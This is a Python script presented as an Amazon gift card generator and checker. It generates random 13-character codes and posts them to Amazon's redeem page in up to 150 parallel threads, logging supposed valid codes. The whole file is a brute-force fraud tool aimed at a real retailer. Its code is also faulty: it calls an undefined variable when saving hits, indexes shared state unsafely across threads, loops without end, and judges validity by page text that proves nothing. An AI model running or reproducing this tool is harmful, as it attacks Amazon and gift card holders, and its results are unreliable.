import requests, threading, time, ctypes, string, random, os
from colorama import init, Fore
from time import sleep

os.system("cls")
init()
ctypes.windll.kernel32.SetConsoleTitleW("Amazon Giftcard Generator & Checker by ny9z#0420")

option = str(input(Fore.RED + '[' + Fore.WHITE + '1' + Fore.RED + ']' + Fore.WHITE + ' Generate Codes\n' + Fore.RED + '[' + Fore.WHITE + '2' + Fore.RED + ']' + Fore.WHITE + ' Check Codes\n' + Fore.RESET + '\n' + Fore.RED + '> ' + Fore.WHITE + 'Options: '))
if option == '1':
        amount = int(input(Fore.RED + '> ' + Fore.WHITE + 'Amount: ' + Fore.RESET ))
        fix = 0
        f = open('giftcards.txt','a')
        while fix <= amount:
                code = ('').join(random.choices(string.ascii_letters.upper() + string.digits.upper(), k=13))
                f.write(code.upper() + '\n')
                print(Fore.GREEN + code.upper())
                fix += 1
                ctypes.windll.kernel32.SetConsoleTitleW("[Amazon Giftcard] by nykz#1337 | Generated: " + str(fix) + "/" + str(amount))
if option == '2':
        giftcards = []
        num = 0
        valid = 0
        invalid = 0
        print()


        def load_accounts():
                with open('giftcards.txt','r', encoding='utf8') as f:
                        for x in f.readlines():
                                giftcards.append(x.strip())

        def safe_print(content):
                print("{}\n".format(content))

        def save(giftcard):
                with open('valid.txt','a', encoding='utf8') as f:
                        f.write(giftcard + '\n')

        def checker():
                global giftcards
                global num
                global counter
                global invalid
                global valid
                success_keyword = "<b>Enter claim code</b>"
                r = requests.post("https://www.amazon.com/gc/redeem?ref_=gcui_b_e_r_c_d_b_w", data={"giftcard": giftcards[num]})
                if success_keyword in r.text:
                        valid += 1
                        print(Fore.GREEN + '[' + Fore.WHITE + 'VALID' + Fore.GREEN + '] ' + giftcards[num] + Fore.WHITE)
                        save(giftcard[num])
                        ctypes.windll.kernel32.SetConsoleTitleW("Amazon Giftcard Generator & Checker by ny9z#0420 | Checked: " + str(num) + "/" + str(len(giftcards)) + " | Valid: " + str(valid) + " | Invalid: " + str(invalid))
                else:
                        print(Fore.RED + '[' + Fore.WHITE + 'INVALID' + Fore.RED + '] ' + giftcards[num] + Fore.WHITE)
                        invalid += 1
                        ctypes.windll.kernel32.SetConsoleTitleW("Amazon Giftcard Generator & Checker by ny9z#0420 | Checked: " + str(num) + "/" + str(len(giftcards)) + " | Valid: " + str(valid) + " | Invalid: " + str(invalid))

        load_accounts()

        while True:
                if threading.active_count() < 150:
                        threading.Thread(target=checker, args=()).start()
                        time.sleep(0.25)
                        num+=1